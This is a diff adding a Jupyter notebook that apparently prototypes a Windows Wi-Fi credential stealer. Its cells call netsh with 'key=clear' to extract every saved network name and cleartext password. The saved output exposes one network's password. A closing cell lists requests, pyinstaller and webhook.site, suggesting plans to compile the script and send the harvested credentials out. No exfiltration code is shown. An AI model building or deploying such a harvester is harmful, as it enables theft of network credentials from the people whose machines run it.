@@ -1,1 +1,155 @@
-print("Hi")
+{
+ "cells": [
+  {
+   "cell_type": "code",
+   "execution_count": 2,
+   "metadata": {},
+   "outputs": [],
+   "source": [
+    "import subprocess\n",
+    "import re\n",
+    "# import requests\n",
+    "# import json\n",
+    "\n"
+   ]
+  },
+  {
+   "cell_type": "code",
+   "execution_count": 20,
+   "metadata": {},
+   "outputs": [
+    {
+     "name": "stdout",
+     "output_type": "stream",
+     "text": [
+      "\n",
+      "Profiles on interface ???????????? ????:\n",
+      "\n",
+      "Group policy profiles (read only)\n",
+      "---------------------------------\n",
+      "    <None>\n",
+      "\n",
+      "User profiles\n",
+      "-------------\n",
+      "    All User Profile     : CXNK0056AEEF\n",
+      "\n",
+      "\n"
+     ]
+    }
+   ],
+   "source": [
+    "command_output = subprocess.run([\"netsh\", \"wlan\", \"show\", \"profiles\"], capture_output = True).stdout.decode()\n",
+    "print(command_output)"
+   ]
+  },
+  {
+   "cell_type": "code",
+   "execution_count": 21,
+   "metadata": {},
+   "outputs": [
+    {
+     "data": {
+      "text/plain": [
+       "['CXNK0056AEEF']"
+      ]
+     },
+     "execution_count": 21,
+     "metadata": {},
+     "output_type": "execute_result"
+    }
+   ],
+   "source": [
+    "profile_names = (re.findall(\"All User Profile     : (.*)\\r\", command_output))\n",
+    "profile_names"
+   ]
+  },
+  {
+   "cell_type": "code",
+   "execution_count": 27,
+   "metadata": {},
+   "outputs": [
+    {
+     "name": "stdout",
+     "output_type": "stream",
+     "text": [
+      "{'ssid': 'CXNK0056AEEF', 'password': 'd180dd0930e625ae'}\n"
+     ]
+    }
+   ],
+   "source": [
+    "wifi_list = []\n",
+    "\n",
+    "if len(profile_names) != 0:\n",
+    "    for name in profile_names:\n",
+    "        wifi_profile = {}\n",
+    "        profile_info = subprocess.run([\"netsh\", \"wlan\", \"show\", \"profile\", name], capture_output = True).stdout.decode()\n",
+    "        if re.search(\"Security key           : Absent\", profile_info):\n",
+    "            continue\n",
+    "        else:\n",
+    "            wifi_profile[\"ssid\"] = name\n",
+    "            profile_info_pass = subprocess.run([\"netsh\", \"wlan\", \"show\", \"profile\", name, \"key=clear\"], capture_output = True).stdout.decode()\n",
+    "            password = re.search(\"Key Content            : (.*)\\r\", profile_info_pass)\n",
+    "            if password == None:\n",
+    "                wifi_profile[\"password\"] = None\n",
+    "            else:\n",
+    "                wifi_profile[\"password\"] = password[1]\n",
+    "            wifi_list.append(wifi_profile) \n",
+    "\n",
+    "for x in range(len(wifi_list)):\n",
+    "    print(wifi_list[x]) \n"
+   ]
+  },
+  {
+   "cell_type": "code",
+   "execution_count": 30,
+   "metadata": {},
+   "outputs": [
+    {
+     "data": {
+      "text/plain": [
+       "[{'ssid': 'CXNK0056AEEF', 'password': 'd180dd0930e625ae'}]"
+      ]
+     },
+     "execution_count": 30,
+     "metadata": {},
+     "output_type": "execute_result"
+    }
+   ],
+   "source": [
+    "wifi_list"
+   ]
+  },
+  {
+   "attachments": {},
+   "cell_type": "markdown",
+   "metadata": {},
+   "source": [
+    "`pip install requests` <br>\n",
+    "`pip install pyinstaller --user` <br>\n",
+    "https://webhook.site/"
+   ]
+  }
+ ],
+ "metadata": {
+  "kernelspec": {
+   "display_name": "Python 3",
+   "language": "python",
+   "name": "python3"
+  },
+  "language_info": {
+   "codemirror_mode": {
+    "name": "ipython",
+    "version": 3
+   },
+   "file_extension": ".py",
+   "mimetype": "text/x-python",
+   "name": "python",
+   "nbconvert_exporter": "python",
+   "pygments_lexer": "ipython3",
+   "version": "3.11.0"
+  },
+  "orig_nbformat": 4
+ },
+ "nbformat": 4,
+ "nbformat_minor": 2
+}
